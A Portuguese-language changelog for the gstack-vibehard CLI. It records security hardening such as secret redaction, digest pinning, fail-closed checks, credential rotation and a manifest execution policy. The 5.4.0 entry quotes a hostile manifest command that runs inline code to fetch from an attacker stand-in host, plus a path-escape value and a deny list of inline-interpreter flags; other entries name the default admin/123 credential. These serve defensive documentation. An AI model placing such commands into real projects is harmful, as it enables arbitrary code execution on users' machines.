# Changelog - gstack-vibehard

## [5.10.0] - 2026-07-17 — PRD45 S45.8: RC checklist — fechamento do programa

Sprint 45.8, o último do PRD45 — prova a física do produto e consolida a release candidate. As 7
golden workflows já estavam provadas individualmente nos sprints anteriores (RBAC E2E real em
S45.0, worker-fail em S45.3, segredo-no-journal em S45.3, tamper→halt em S45.2/S45.6, install
transacional em S45.5). Este sprint entrega a fonte-verdade de prontidão.

- **`src/dream/rc-checklist-prd45.js`** (espelha o `rc-checklist.js` do PRD41 S41.9). Mapeia
  **cada** achado do PRD45 (4 P0 + 12 P1) → sprint → versão → o teste de prova que reprova se a
  capacidade sumir. `prd45Readiness()` só declara `ready:true` com **todos os P0 delivered**.
  Sem enfeite: o teste verifica que cada item `delivered` aponta um arquivo de teste que **existe
  de verdade** — um item mentiroso reprova a própria suíte.
- **P1.3 (loader V3 canônico) marcado `partial`** de forma transparente: o schema e a migração V3
  existem (desde S42.6), mas o loader e o `create` ainda emitem v2 (campos v3 dormentes — nenhum
  usuário recebe manifest v3 hoje). Não bloqueia o RC (o gate é P0); declarado como incremento,
  exatamente como o S41.9 tratou o P1.7 (matriz CI incremental).

**Programa PRD45 fechado (S45.0–S45.8, v5.1.0 → v5.10.0)**: os 4 P0 e 11 dos 12 P1 `delivered`;
P1.3 `partial` honesto. RC `ready:true`. Cada sprint: proof full ready:true, QG strict 0, suíte
verde, controle negativo em cada capacidade.

## [5.9.0] - 2026-07-17 — PRD45 S45.7: claims verificáveis + especialização honesta de agentes

Sprint 45.7 — alinhar os claims e os 22 agentes ao que realmente fazem.

- **P1.11 — claims sem prova comportamental / 3 CLAIM_CONTRACTS mortos**. Três dos quatro
  contratos comportamentais (`qa-lens`/`action-kernel`/`loop-checkpoint`) não correspondiam a
  nenhum claim — `contractFor()` nunca os alcançava, então o Dream Audit só reconhecia `verify`
  como REAL, embora essas capacidades (visual-gate, action-kernel, loop-checkpoint) existam e
  tenham teste de controle negativo. Declarei os **3 claims faltantes** em `src/dream/auditor.js`;
  com o contrato completo, graduam **REAL** (prova comportamental de verdade, não presença de
  arquivo). Claims REAL subiram de **1 → 4**; o publish-guard `dream-required` segue verde.
  Nova guarda `assertContractsBindToClaims` (`src/dream/claim-contract.js`): toda chave de
  `CLAIM_CONTRACTS` **deve** corresponder a um claim real — impede config morta no futuro.

- **P1.12 — a fábrica anunciava especialistas sem knowledge pack**. Dos 22 agentes, só 3
  (devops/frontend/mobile) receberam pack; os outros 19, zero — e todos eram anunciados igual.
  Novo status honesto por agente (`src/agents/factory.js`): **`generic_adapter`** (0 packs, não é
  especialista) · **`specialized`** (≥1 pack) · **`verified`** (pack + prova comportamental). O
  manifest V2 passa a declarar `specialization` — estado real `{generic_adapter: 19,
  specialized: 3, verified: 0}`. Um agente sem pack **não pode** ser anunciado como especialista
  verificado.

## [5.8.0] - 2026-07-17 — PRD45 S45.6: artifact lock (supply chain verificada, não declarada)

Sprint 45.6 — troca garantia declarativa por verificação criptográfica na cadeia de suprimento.

- **P1.9 — o Supply Chain Doctor declarava `hashes: ok` sem verificar hash nenhum**
  (`src/installer/supply-chain.js`). Era uma string de recomendação hardcoded: uma dependência
  alterada a montante (imagem `latest`, clone sem commit fixo, download sem digest) mudava o
  produto instalado sem o doctor notar. Novo **`src/installer/artifact-lock.js`**: cada artefato
  declara um pin **imutável** e é classificado — **image** exige `@sha256:<64hex>` (nunca
  `latest`/tag), **git** exige commit fixo de 40 hex, **url** exige sha256 publicado (sem hash →
  `unknown` honesto), **npm** exige version exata + integrity. Estados `verified | unknown |
  blocked` — **nunca `ok` sem prova**; agregação fail-closed. Adulterar um byte do digest ⇒
  `blocked`. `GSTACK_ARTIFACT_LOCK` reusa o `CASDOOR_IMAGE` já fixado por digest em `create.js`.
  O doctor agora reporta a verificação **real** no lugar da garantia inexistente.

Nota: o outro item do DoD do sprint — "restore não sobrescreve arquivo alterado pelo usuário" —
já estava implementado e testado (`restore.js:driftBlocks` pula o restore quando o hash atual
diverge do `installedHash`, exigindo `--resolve-drift`); confirmado, sem alteração.

## [5.7.0] - 2026-07-17 — PRD45 S45.5: install/create transacional + dry-run fiel

Sprint 45.5 — Full é tudo-ou-restaura; o dry-run mostra os efeitos reais.

- **Motor transacional `src/installer/provision-txn.js`** (núcleo do P1.7). Operation plan único
  que o dry-run descreve e o executor usa como registro de compensadores; journal **write-ahead
  em disco** (crash-safe, ao contrário do `InstallJournal` em memória); compensação automática em
  **ordem reversa** quando uma op falha; ownership por recurso (a op que falhou não é compensada);
  estados `committed | rolled_back | rollback_failed`; `recoverPlan` retoma o rollback de um
  processo morto (o doctor recupera). Complementa `operation-plan.js`/`journal.js` (que cobrem
  escritas de arquivo) — containers/globais/processos ganham a transação que faltava.

- **P1.8 — `create --full --dry-run` omitia os efeitos reais**. Listava basicamente o projeto e
  `~/.atomic`, mas o caminho real provisiona Docker/Casdoor (container + rede + volume), ECC,
  AgentMemory. Consentimento informado falso. Agora `buildFullProvisionPlan` é a fonte única e o
  dry-run expõe cada operação — container Casdoor por **digest** (nunca `latest`), rede loopback
  `127.0.0.1:8000`, escopo global, e o comando exato de rollback. Lite mostra `operations: []`
  (não suja a máquina).

- **P1.7 — install/create Full não eram transacionais**. Falha tardia deixava a máquina
  parcialmente modificada, terminando em `partial_with_restore_available` com restore **manual**.
  Agora `createFullTransactional` envolve os passos pós-provisionamento: uma falha depois do
  Casdoor no ar **derruba o container automaticamente** (`docker compose down -v`). O journal
  write-ahead em `.gstack/` permite o `doctor` recuperar um create que morreu no meio.

Nota: o contrato de fases de `runFullProvisioning` ficou intacto (sem regressão nos testes de
create); o golden foi regenerado legitimamente (dry-run mais rico, ordem de chaves preservada).

## [5.6.0] - 2026-07-17 — PRD45 S45.4: Headroom e Output Guard operacionalmente honestos

Sprint 45.4 — roteamento child-scoped real sem quebrar harness nem expor proxy.

- **P1.6 — o redact-proxy não era seguro para tráfego real (`src/security/redact-proxy.js`)**.
  - `server.listen(port)` fazia bind em **todas as interfaces**. Agora bind **exclusivo em
    `127.0.0.1`** (nunca `0.0.0.0` — não exposto na rede local).
  - Health endpoint `/__gstack/health` com **nonce**: outro processo na porta não é confundido
    com o proxy.
  - `setEncoding("utf8")` preservando `content-encoding` **corrompia body gzip** no cliente.
    Agora força `accept-encoding: identity` ao upstream + strip de `content-encoding`/
    `content-length`.
  - Filtra headers **hop-by-hop** (RFC 7230) na ida e na volta. A credencial de API do cliente
    segue repassada — é como o harness autentica, não é vazamento.
  - Redação com **rolling-window** (cauda de 512 B entre chunks): segredo partido no boundary
    não atravessa mais (antes era por linha). Limite de buffer + timeouts (anti-DoS).

- **P1.4 — Headroom default-on não chegava ao caminho real de `dev`**
  (`src/tools/headroom-policy.js`, `src/commands/runtime-supervisor.js`).
  - `ensureRoutedChildEnv` dizia `routed:true` só porque a porta abriu ou o PID estava vivo —
    **nunca provou tráfego**. Agora exige um **probe de tráfego real** (`defaultTrafficProbe`:
    socket loopback de verdade) antes de afirmar `routed`. Probe falho ⇒ `routed:false`, env do
    filho **intocado** (fail-safe: o `dev` roda sem routing).
  - `devRoutingOptions` liga o routing **child-scoped** no `dev`: default-on no Full, opt-out
    `GSTACK_HEADROOM_ROUTE=off` preservado, **nunca config global**. O overlay só se aplica ao
    processo que o GStack spawna.

Nota: neste ambiente o headroom está `callable_not_routed`, então o probe falha ⇒ `routed:false`
⇒ o `dev` roda exatamente como antes. O caminho fica ligado para quando o headroom estiver
funcional, e `routed` nunca é reivindicado sem prova.

## [5.5.0] - 2026-07-17 — PRD45 S45.3: workflow fail-closed + journal sem secrets

Sprint 45.3 — nenhuma tarefa falha vira `passed` e nenhum segredo entra no replay do journal.

- **P0.3 — workflow podia aprovar implementação que falhou (`src/workflow-graph/runner.js`)**.
  Um worker com `ok:false` só logava `node_failed` e o **verifier rodava em seguida**, podendo
  marcar o run como `passed` — testes pré-existentes passavam sem a tarefa ter sido feita (falso
  verde). Agora o worker falho **não chega ao verifier**: é tratado pela mesma máquina de
  retry/handoff/cap, e o verifier só roda sobre trabalho de fato executado. `planner`/`rubric`
  que **lançam** abortam o run **fail-closed**, nunca seguindo para worker/verifier.

- **P1.5 — journal persistia segredo em campo não literal (`src/workflow-graph/journal.js`)**.
  O `appendEvent` só apagava as chaves **exatas** `secret`/`transcript` no top-level; um token em
  `task`/`summary`/`signature`, aninhado em objeto/array ou embutido numa URL era gravado em
  `journal.jsonl`. Novo `src/workflow-graph/redact-event.js` faz **redação recursiva** antes de
  qualquer escrita — chave sensível por nome (`token`/`password`/`apiKey`…), `redactSecrets` em
  toda string (padrões `sk_`/`ghp_`/URL com token), objetos/arrays aninhados, com limites de
  profundidade e tamanho. Reusa `src/security/redact.js` (redactor único) — não reimplementa
  padrões.

Nota: `runWorkflow` foi decomposto (`buildRunContext`/`prepareRun`/`runLoop` + helpers de step)
para caber no QG — dívida de complexidade pré-existente que o Fallow diff-scoped trouxe ao escopo.

## [5.4.0] - 2026-07-17 — PRD45 S45.2: policy de execução + contenção do Runtime Manifest

Sprint 45.2 — fecha o achado P1.2: um repositório **clonado** não executa mais comando
arbitrário ao rodar `dev`. A validação anterior do manifest só checava estrutura (`command` é
array de strings), então `["node","-e","fetch(evil)"]` e `cwd:"../../.."` passavam direto para
o `spawn`. `shell:false` não elimina esse vetor.

- **Novo `src/runtime/exec-policy.js`** — camada de confiança **antes** do spawn:
  - `classifyCommand` — **deny** para interpretador com flag de código **inline** (`node -e`,
    `python -c`, `powershell -Command`, `bash -c`, `cmd /c`…); **allow** para runner de projeto
    (`npm`/`pnpm`/`yarn`/`concurrently`/`turbo`/`nx`) e interpretador rodando **arquivo**
    (`node server.js`); **ask** para binário fora da allowlist (caminho absoluto/desconhecido).
  - `resolveContainedCwd` — resolve por **realpath** e exige contenção no workspace, pegando
    **symlink/junction** que escapa (o `assertWithin` existente usava resolve lógico).
  - `manifestTrustDigest` — sha256 canônico (estável à ordem de chaves); mudou ⇒ re-trust.
  - `evaluateManifestExec` — gate **fail-closed**. `deny`/escape nunca passam; `ask` só passa
    com o trust do **digest exato**. Persistência em `.gstack/runtime-trust.json`;
    **`dev --trust`** aprova o conteúdo atual (override auditado). `deny`/escape não são
    destraváveis por trust.
  - Ligado ao `dev`: manifest hostil é **bloqueado antes de qualquer spawn**.

Nota de não-regressão: o gate foi validado contra os manifests que o **próprio `create`** gera.
O template com `concurrently` cairia em `ask` e quebraria o `dev` de projeto novo — por isso
`concurrently`/`turbo`/`nx` entraram nos runners de projeto, travado por um teste de regressão
permanente. O E2E que usava binário inexistente foi reescrito para preservar sua intenção
(spawn falho não derruba o CLI) e ganhou um par que prova que `node -e` malicioso é barrado
antes de qualquer efeito colateral.

## [5.3.0] - 2026-07-17 — PRD45 S45.1: supervisor seguro + ownership de PID fail-closed

Sprint 45.1 — fecha os dois achados de segurança do supervisor de runtime (P0.2 e P1.1). O
`stop` nunca mais mata processo alheio nem perde o estado de um processo ainda vivo.

- **P0.2 — `stop` perdia controle de processo vivo (`src/runtime/supervisor.js`,
  `src/commands/runtime-supervisor.js`)**.
  - Qualquer erro de kill virava `already-gone`, escondendo acesso negado e sinal falho. Agora
    o status é **tipado por errno**: `ESRCH` → `already_gone`, `EPERM`/`EACCES` →
    `access_denied`, resto → `signal_failed`. Nunca colapsa em "sumiu".
  - `stopCommand` chamava `clearState` **incondicionalmente** — apagava o state mesmo com PID
    vivo, impossibilitando o retry (órfão/porta/handle presos). Agora `stopOutcome` só declara
    `clearable` quando **nada** ficou pendente (vivo, negado, sinal-falho ou pulado); o state é
    **preservado** para retry idempotente, e o `stop` devolve **exit code não-zero** quando não
    encerrou tudo.

- **P1.1 — ownership de PID falhava aberto (`isProcessOurs`)**. Retornava `true` (matava)
  quando o baseline não era verificável — um state adulterado podia fazer o GStack matar um PID
  reusado. Novo `ownershipVerdict` **tipado**: baseline ausente/inválido = `unverified_baseline`
  ⇒ **não-nosso** (fail-closed, pulado como `skipped_unverified`); idade ilegível
  (permissão/SO) = `unverified_age` ⇒ procede **porém auditado** (decisão de produto: não
  trancar o `stop` legítimo onde ler a idade do processo é impossível); idade divergente =
  `foreign` (pid reusado). `isProcessOurs` permanece como wrapper booleano compatível.

Nota: os testes que cristalizavam o contrato antigo foram atualizados coerentemente (status com
hífen → underscore; `{}` sem `startedAt` passa de `true` para `false` fail-closed; erros de kill
de teste passaram a popular `.code`, mais fiéis ao `process.kill` real). `stopService`
decomposto (`skipRow` + `attemptKill`) para caber no QG (cc≤6).

## [5.2.0] - 2026-07-17 — PRD45 S45.0 fechado: credencial rotacionada + fim do falso-verde

Fecha o Sprint 45.0. Depois de fazer o Casdoor **bootar** (v5.1.0), este ciclo remove a
credencial-padrão conhecida e mata um falso-verde de capacidade — os dois últimos itens do
escopo do sprint ("substituir credencial conhecida", "sem placeholder", "publish guard para
dream NOT_PROVED required e teste E2E falho").

- **Rotação da credencial-padrão (`src/cli/create.js`)**. `admin/123` é público (demo data do
  Casdoor); IAM no ar com credencial conhecida faz de qualquer processo local um admin. O
  `create` agora **rotaciona** (antes só avisava) para uma senha de 32 chars
  (`randomBytes` base64url) e a guarda no **keychain do SO** via Secrets Broker — nunca no
  repo/state.
  - **Ordem é segurança**: grava no keychain **antes** de trocar. Se gravasse depois e o
    keychain falhasse, a senha nova estaria ativa e perdida (usuário trancado fora do próprio
    IAM). Sem keychain disponível ⇒ **não rotaciona** (guardar seria impossível) + aviso.
  - **Controle negativo em produção**: reconfirma que `admin/123` parou de autenticar; a API
    dizer "ok" não basta (`rotation_failed` sem essa prova).
  - A senha **nunca vai no argv** (legível via `ps`): o curl a lê de arquivo
    (`--data-urlencode newPassword@file`).
  - Declarada em `required` no schema de secrets **só no Full** — `secrets run` injeta apenas
    os required, então é assim que o usuário a recupera
    (`gstack_vibehard secrets run -- node -e "console.log(process.env.CASDOOR_ADMIN_PASSWORD)"`).
  - Provado contra Casdoor real: após rotacionar, `admin/123` → "password or code is
    incorrect"; a senha do keychain → "built-in/admin"; e o comando impresso devolve
    exatamente a senha guardada.

- **Fim do falso-verde de capacidade (`scripts/clean-machine-pack.mjs` + agregador)**. O pack
  marcava `casdoor-rbac`/`atomic-merge`/`agentmemory-persist` como **passed** só porque
  `docker info` respondia (`dockerAvailable() ? "passed" : ...`). Prova de que era mentira:
  `casdoor-rbac` esteve "passed" durante todo o período em que o Casdoor crash-loopava e nem
  subia.
  - `casdoor-rbac` agora tem **E2E real**: sobe o compose gerado pelo próprio `create`, espera
    health, exige **anônimo negado E credencial válida aceita** (só negar tudo também passaria
    como "RBAC"), confere a UI, e derruba tudo.
  - Novo status **`not_proved`** (engine presente, E2E não executado) — distinto de
    `blocked_missing_engine` (sem engine) e de `failed` (E2E rodou e reprovou).
    `atomic-merge`/`agentmemory-persist`/`openhands-sandbox` o declaram (E2E deles: S45.8).
  - Novo veredito **`capabilities_unproven`** (exit 1), abaixo de `ready_engines_blocked`: sem
    engine a culpa é da máquina; com engine e sem E2E a culpa é nossa.

- **Publish guard: 2 checks HARD novos (`src/project-plan/publish-guard.js`)**.
  - `dream-required`: claim com **contrato comportamental declarado** que não está `REAL`
    reprova (promessa sem prova); RISK/PLACEBO nunca publicam. Claim sem contrato pode ser
    `NOT_PROVED` honesto — travar em todos tornaria o gate insatisfazível.
  - `capability-e2e`: capacidade `required` fora de `passed`/`not_applicable` reprova (cobre
    `failed`, `not_proved`, `blocked_missing_engine`). Sem relatório ⇒ `not_applicable` com ação.

Notas: o fail-closed se provou na prática — diante de uma asserção de teste errada minha (regex
de negação só aceitava "login", mas o POST do Casdoor nega com "Unauthorized operation"), o
pack **reprovou** em vez de dar verde falso. `publishGuard` foi decomposto (cc 30→4) para caber
no QG (cc≤6), dívida pré-existente que o Fallow diff-scoped puxou ao escopo.

## [5.1.0] - 2026-07-16 — PRD45 S45.0: o Casdoor do Full sobe DE VERDADE (P0.1/P0.4/P0.5)

Sprint de congelamento dos P0 de configuração do PRD45. O achado central não estava no PRD:
**o Casdoor nunca subiu**. Ele crash-loopava com `panic: dial tcp [::1]:3306` desde sempre —
provado com Docker real que **não é regressão** (o compose original, com `:latest` e
`8000:8000`, crash-loopa idêntico). O Full prometia IAM local e entregava um container morto,
enquanto o `create` afirmava "Casdoor IAM rodando".

- **P0.5 — o Casdoor sobe (`src/cli/create.js`)**. Três bugs empilhados, cada um só visível
  depois de corrigir o anterior:
  1. **Envs fantasma** — o compose passava `driver`/`dataSource`; essas chaves não existem no
     Casdoor. Ele lê `driverName`/`dataSourceName` de `/conf/app.conf` (Beego), cujo default é
     MySQL literal. As envs eram silenciosamente ignoradas. Agora o `app.conf` real é montado.
  2. **Nome do driver** — o sqlite embutido é `modernc.org/sqlite` (Go puro), registrado como
     **`sqlite`**. Com `sqlite3` o ormer até funciona (normaliza sqlite3→sqlite), mas o adapter
     do Casbin passa o nome cru e morre em `unknown driver "sqlite3"`.
  3. **Dono do volume** — em `/var/lib/casdoor` (inexistente na imagem) o volume nomeado nasce
     `root:root`, mas o processo roda como uid1000 → SQLite `CANTOPEN(14)`. Em `/home/casdoor`
     (existe na imagem com dono 1000) o volume herda o dono e grava.

  Validado end-to-end com o compose **gerado pelo código**: HTTP 200, `POST /api/login`
  admin/123 → `built-in/admin`, `casdoor.db` de 630KB no volume, bind só em `127.0.0.1:8000`.

- **P0.5 — health check fail-closed**. `docker compose up -d` devolver output **não é prova de
  saúde** — era exatamente nisso que o `create` se baseava para dizer "Casdoor IAM rodando"
  enquanto o container crash-loopava. Agora só afirma após **HTTP 2xx real** em
  `/api/get-account`; sem isso, reporta `degraded` honesto com dica de diagnóstico
  (`phases.casdoor.status`).

- **Vazamento entre projetos (achado fora do PRD45)** — o compose mora sempre em `.gstack/`,
  então o project-name default do Docker Compose seria `gstack` para **todo** projeto: dois
  projetos GStack compartilhariam o **mesmo banco de identidade**. O volume passa a ter nome
  explícito por projeto (`casdoor-<slug>-data`).

- **P0.1 — headroom MCP real**. O `.mcp.json` do Full apontava para `npx -y @gstack/headroom-proxy`,
  um **pacote fantasma** (E404 no registry). Agora usa o binário real (`headroom mcp`), idêntico
  ao caminho de install em `src/harness/headroom.js`. Regra: nunca `npx -y` sem pin em config
  gerada (baixaria da rede ao abrir o harness).

- **P0.4 — Casdoor não nasce inseguro**. Imagem fixada **por digest** (nunca `:latest`, mutável);
  publicado **só em loopback** `127.0.0.1` (nunca `0.0.0.0`, que exporia a credencial-padrão
  conhecida na rede local); **container por projeto** (era o global `casdoor`, que fazia dois
  projetos disputarem o mesmo container); aviso de segurança explícito sobre o `admin/123`.

Notas: `version: "3.8"` preservado de propósito no compose (o fallback `docker-compose` v1
depende dele). O `app.conf` é gerado via `join("\n")` — checkout Windows pode trazer CRLF no
fonte, e CRLF quebra o parser do Beego no container Linux. A rotação da senha `admin/123` via
Secrets Broker fica para o restante do S45.0, agora que o Casdoor de fato responde.

## [5.0.1] - 2026-07-14 — CI verde: golden cross-OS + capability-e2e invocation

Corrige duas falhas de CI que só apareceram no primeiro push do trilho PRD42 ao GitHub (rodavam
em código nunca exercitado localmente: sem Docker aqui, e sem os symlinks de /var do macOS).

- **`scripts/golden.mjs`** — `caseCwd` agora resolve `realpathSync` do dir temporário. Sem isso, o
  filho resolvia `process.cwd()` para o path REAL (macOS `/var`→`/private/var`; Windows short-8.3→
  long) e o marcador `<CWD>` não casava no normalize, dando **falso "drift" de golden** em
  `test (macos-latest)` e `test (windows-latest)` (ubuntu passava). Fixtures inalteradas (já eram
  OS-independentes por marcador).
- **`scripts/test-capabilities.mjs`** — invocação `node --test tests/e2e/capabilities/` (diretório)
  falhava com "Cannot find module" no Node ≥21; trocado pelo **glob** `tests/e2e/capabilities/**/*.
  test.js`. Só disparava no runner **com Docker** (ubuntu CI), depois do guard de engine ausente —
  por isso passou despercebido local. Com Docker presente o container real (alpine pinado por
  digest) roda e o teardown limpa.

QG strict 0 · lint 0 · typecheck limpo · golden 2/2 local. Patch de infra de teste; sem mudança de
comportamento do produto publicado.

## [5.0.0] - 2026-07-14 — PRD42 fechado: verdade de capacidade do intake à máquina limpa

Release maior que consolida o programa PRD42 (14 sprints, v4.10.0→v4.23.0) sobre o núcleo de
integridade do PRD41 (v4.9.0). O produto agora prova, com controle negativo, que **nada é enfeite**
— cada gate/loop/claim só fica verde com execução comprovada por evidência. Destaques por fase:

**Fase 0 — Capability Truth + reparo de baseline (S42.0A–E):** Lite não materializa capacidades Full
(sem vazar Casdoor/Headroom MCP nem `sandbox:"openhands"`); harness honesto (`agent-hooks` só onde há
`real_hooks`); claims numéricos removidos ("até 95%"→"medido por ledger"); dream behavioral no CLI;
Capability Contract (`gstack.capability-contract.v1`); `start` dirigido pelo Loop Engine canônico;
backend E2E em jobs de CI dedicados (`capability-e2e.yml`) — required sem engine BLOQUEIA, não pula;
Golden Harness + package lifecycle + curadoria Replit.

**Fase 1 — Produto (S42.1–6):** intake estruturado + Product Brief (aceites com verificador real ou
`pending_verifier`); Design Direction v2 com migração; Skill Execution Contract
(`selected→loaded→applied→verified`, mutation test); Behavioral Conformance (`agents conformance`,
`inconclusive`≠verde); Artifact Review Pipeline (produtor≠reviewer, traceability determinística);
Runtime manifest v3 + preview só `ready` após health real.

**Fase 2 — Qualidade (S42.7–9):** step-close incremental (nunca suíte inteira por edição); Quality
Profiles + `verify --tier` (engine ausente em release = `blocked_missing_engine`; `not_applicable`≠
`passed`); debug científico (`reported→…→regression_green`, 3 fracassos→`architecture_review_required`).

**Fase 3 — Fechamento (S42.10–12):** handoff/reidratação compacta (tokens `estimated`, nunca claim
Headroom sem routing); paralelismo adaptativo (quota `unknown` nunca suficiente; DAG misto→ask_user);
Acceptance Demo `proof --explain` (visão leiga+técnica da MESMA evidência; **a média nunca esconde um
P0**; sem deploy = `not_applicable`).

**Fase 4 — Máquina limpa (S42.13):** Clean-Machine Test Pack (`gstack.cleanmachine.v1`,
`npm run test:cleanmachine`) — jornada real do usuário final com veredito por capacidade e por
plataforma; só `passed` é verde; backend sem engine ⇒ `blocked_missing_engine` (nunca "ready" liso);
runbook cross-OS. Os 23 cenários E2E do §S42.13 cobertos pelas capacidades provadas em S42.0–S42.12.

Gates do release: lint 0 · typecheck limpo · JS 1147 (1146 pass/0 fail/1 skip) + Py 84 · QG L1 strict
0 · proof `--profile release` ready:true · dream behavioral 0 RISK/0 PLACEBO. Publicação com aprovação
humana e source parity.

## [4.23.0] - 2026-07-14 — Clean-Machine Test Pack (PRD42 S42.13, parte 1)

Abre a Fase 4. Entrega o artefato-título que o usuário pediu para fechar o programa: uma prova de
**máquina limpa** da jornada real do usuário final, com veredito honesto por capacidade e por
plataforma. **Não reimplementa** — compõe os provadores existentes.

- **`src/installer/clean-machine-pack.js`** (schema `gstack.cleanmachine.v1`): agregador PURO do
  veredito. Invariantes fail-closed — só `passed` é verde; `not_applicable`/`blocked_missing_engine`/
  `not_run` nunca contam nem inflam o placar; capacidade `unsupported` na plataforma corrente ⇒
  `not_applicable` (nunca "passa por omissão"); backend REQUIRED sem engine ⇒
  `blocked_missing_engine` ⇒ veredito `ready_engines_blocked` (parcial honesto, **nunca "ready"
  liso nem "not_ready" por engine**); qualquer jornada falha ⇒ `not_ready`; jornada não-rodada ⇒
  `incomplete`.
- **`scripts/clean-machine-pack.mjs`** + **`npm run test:cleanmachine`**: orquestra a jornada real
  compondo `test:e2e:package` (tarball → prefixo isolado → create/build/uninstall byte-a-byte),
  `tools clean-machine --json` (12 invariantes offline), `proof --profile full --explain --json` e
  `dream audit`. Backends sem Docker local = `blocked_missing_engine` (E2E real em CI dedicado).
  Grava `.gstack/reports/cleanmachine.json`.
- **`.docs/GUIDES/clean-machine-runbook.md`**: passo a passo para o usuário rodar em Windows/macOS/
  Linux e reportar o JSON (o transcript vira insumo, como no PRD26), com matriz de plataforma.
- **Testes** `clean_machine_pack` (7): 3 controles negativos (backend sem engine nunca vira "ready";
  jornada falha ⇒ not_ready mesmo com resto verde; unsupported ⇒ N/A nunca passed). QG strict 0;
  lint 0; typecheck limpo. JS **1147** (1 skip) + Py **84**.

Os 23 cenários E2E do PRD42 §S42.13 já estão majoritariamente cobertos pelas capacidades provadas
em S42.0–S42.12 (acceptance demo, behavioral conformance, debug científico, Lite/Full, tarball
lifecycle, OpenHands wsl_only, matriz de harness). O **gate de release + tag/publish `v5.0.0`**
permanece dependente de aprovação humana e source parity (não executado autonomamente).

## [4.22.0] - 2026-07-14 — Acceptance Demo + scorecard + health pós-deploy (PRD42 S42.12)

Fecha a Fase 3. `proof --explain` mostra a MESMA evidência do proof em duas visões — uma **leiga**
(fundador/usuário final) e uma **técnica** (auditoria de gates) — que nunca divergem no veredito.

- **`src/skills/delivery-scorecard.js`** (schema `gstack.delivery-scorecard.v1`): placar de entrega
  com invariante inegociável — a **MÉDIA NUNCA ESCONDE UM P0**. Existindo qualquer item P0
  reprovado, o veredito é `blocked`, por mais alto que seja o score dos demais. **Health pós-deploy
  SEM deploy = `not_applicable`** — nunca conta como aprovado nem entra na média (N/A não é verde;
  herda a lição do S42.8). `scorecardFromProof` adapta um `gstack.proof.v1` em itens do placar.
- **`src/skills/acceptance-demo.js`** (schema `gstack.acceptance-demo.v1`): `explainProof` deriva as
  visões leiga+técnica da MESMA evidência. Invariante fail-closed: `lay.ready === technical.ready ===
  proof.ready` — a visão leiga JAMAIS diz "PRONTO" com a técnica bloqueada (lança se divergir).
- **`src/commands/proof.js`**: flag `--explain` (aditiva) renderiza/serializa as duas visões;
  `proofCommand` decomposto (`buildDemo`/`emitJson`) para cc≤6.
- **Testes** `acceptance_demo`: média 90% NÃO vira "ready" com um P0 quebrado (controle negativo);
  sem deploy→health not_applicable (nunca passed); deploy quebrado→health P0→blocked; visões não
  divergem; **proof bloqueado ⇒ visão leiga nunca diz pronto** (controle negativo). QG strict 0;
  lint 0; typecheck limpo.

## [4.21.0] - 2026-07-14 — Paralelismo adaptativo (PRD42 S42.11)

Estende o preflight de DAG (`analyzeParallelSafety`) com decisões honestas de quando paralelizar.

- **`src/project-plan/adaptive-parallel.js`** (schema `gstack.adaptive-parallel.v1`):
  `quotaSufficient` — quota `unknown` (não numérica) **NUNCA é "suficiente"**. `planParallelism`:
  ciclo→`blocked`; quota insuficiente/unknown OU **DAG misto → `ask_user`** (decisão humana, não
  auto); independente+quota ok→`parallel`; encadeado→`sequential`. `mergeBarrier`: nenhuma branch
  entra no merge sem passar TODOS os **gates comuns**. `packReference`: Context Pack por **hash**
  (nunca inlinado — economiza contexto de verdade).
- **Testes** `adaptive_parallel`: quota unknown nunca suficiente; independente+quota→parallel; DAG
  misto→ask_user; **quota unknown força ask_user mesmo com DAG paralelo** (controle negativo);
  encadeado→sequential, ciclo→blocked; merge barrier bloqueia branch sem gate comum; pack por hash
  determinístico e não-inlinado. QG strict 0; lint 0; typecheck limpo.

## [4.20.0] - 2026-07-14 — Handoff / reidratação compacta (PRD42 S42.10)

Abre a Fase 3 (fechamento). Ao fechar um ciclo, produz um "brief vivo" para retomar a sessão sem
reler tudo — com honestidade sobre tokens e economia.

- **`src/project-plan/handoff.js`** (schema `gstack.handoff.v1`): `buildHandoff` (objetivo/mode/
  aceites do Product Brief S42.1 + estado + threads abertas; sem brief não inventa). `estimateTokens`
  **SEMPRE rotulado `estimated`** (heurística ~4 chars/token, nunca "measured"). `resumeBenchmark`
  (handoff vs leitura integral; economia rotulada `estimated`). `headroomClaim`: **sem `routed` não
  há claim** (`callable_not_routed`); com routing, exige delta MEDIDO no ledger — nunca inventa número.
- **Testes** `handoff_rehydration`: tokens sempre estimated; brief vivo + threads (sem brief=nulo);
  benchmark rotula economia como estimada; headroom sem routing/sem delta → sem claim (controles
  negativos); claim válido só com routed+delta medido. QG strict 0; lint 0; typecheck limpo.

## [4.19.0] - 2026-07-14 — Debug científico (PRD42 S42.9) — FECHA A FASE 2

Método sobre chute: um bug percorre `reported → reproduced → hypothesis → fix_applied →
regression_green`, com dois invariantes que impedem debugging cego.

- **`src/project-plan/debug-investigation.js`** (schema `gstack.debug-investigation.v1`):
  máquina de estados fail-closed (`advanceDebug`/TRANSITIONS). `reproduce` exige
  **`evidence.reproduced === true`** (não basta afirmar). `applyFix` **BLOQUEIA editar antes de
  reproduzir** (estado `reported`). `recordRegression`: verde → `regression_green` (fim); vermelha
  conta a tentativa e, ao atingir **MAX_FIX_ATTEMPTS (3), HARD HALT** em
  `architecture_review_required` (para de consertar o sintoma — o problema é estrutural); antes do
  limite, volta a `hypothesis`.
- **Testes** `debug_investigation`: caminho feliz; **editar antes de reproduzir bloqueado**;
  reprodução exige evidência; **3 vermelhas → architecture_review_required**; 1 vermelha volta a
  hypothesis; recordRegression fora de fix_applied lança; terminal não avança (controles negativos).
  QG strict 0 (cc≤6); lint 0; typecheck limpo. **Fase 2 (S42.7-9) COMPLETA.**

## [4.18.0] - 2026-07-14 — Quality Profiles + tiers + budgets (PRD42 S42.8)

`verify --tier smoke|regression|release` — FLAG NOVA, **ortogonal** ao `--profile` (o profile diz
quais gates existem; o tier diz quão fundo). Ausência de `--tier` = comportamento intacto.

- **`src/project-plan/quality-profile.js`** (schema `gstack.quality-profile.v1`): `TIER_SPEC`
  (smoke/regression sem engine; **release EXIGE engine**). `aggregateTier`: release sem engine →
  `blocked_missing_engine` (nunca skip-verde); **`not_applicable` NUNCA conta como `passed`**
  (`passedCount` o exclui); `tierSpec` fail-closed em tier desconhecido.
- **`src/project-plan/budget-policy.js`**: `evaluateBudget` (within/over medidos; **`unknown`
  sem medição nunca é "dentro do orçamento"**).
- **`src/project-plan/qa-plan.js`**: `buildQaPlan` combina tier (profundidade) + superfície do diff
  (S42.7); superfície de risco eleva o mínimo mesmo em smoke.
